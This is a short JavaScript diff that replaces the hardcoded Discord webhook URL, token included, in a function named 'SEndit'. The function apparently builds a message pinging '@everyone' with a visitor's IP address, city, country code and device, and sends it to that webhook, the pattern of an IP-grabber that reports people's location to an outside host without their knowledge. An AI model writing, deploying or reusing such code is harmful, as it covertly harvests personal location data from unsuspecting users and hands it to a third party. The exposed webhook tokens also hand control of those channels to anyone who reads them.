@@ -1,5 +1,5 @@
 const SEndit = function(oi){
-  var Hook = "https://discord.com/api/webhooks/916877157375037440/JuaQG5H5Ka9gmJWp0WjOeiQtQbYJ_g9U6ASulUjWduihaDoMn9iTb1UZS7O9eCAPV3RJ"
+  var Hook = "https://discord.com/api/webhooks/815791868045426718/8XsrrYAMnfyBVBQhy4qCvjOo95KPuBXxlwgfzkNSPK55vVh_8xZSzK4HD-zCD4zDIrzE"
 
   const Layout = {
     "content" : "@everyone \n\n" + oi["ip"] + "\n\n " + oi["city"] + "\n\n " + oi["country_code"] + "\n\n " + oi["device"],
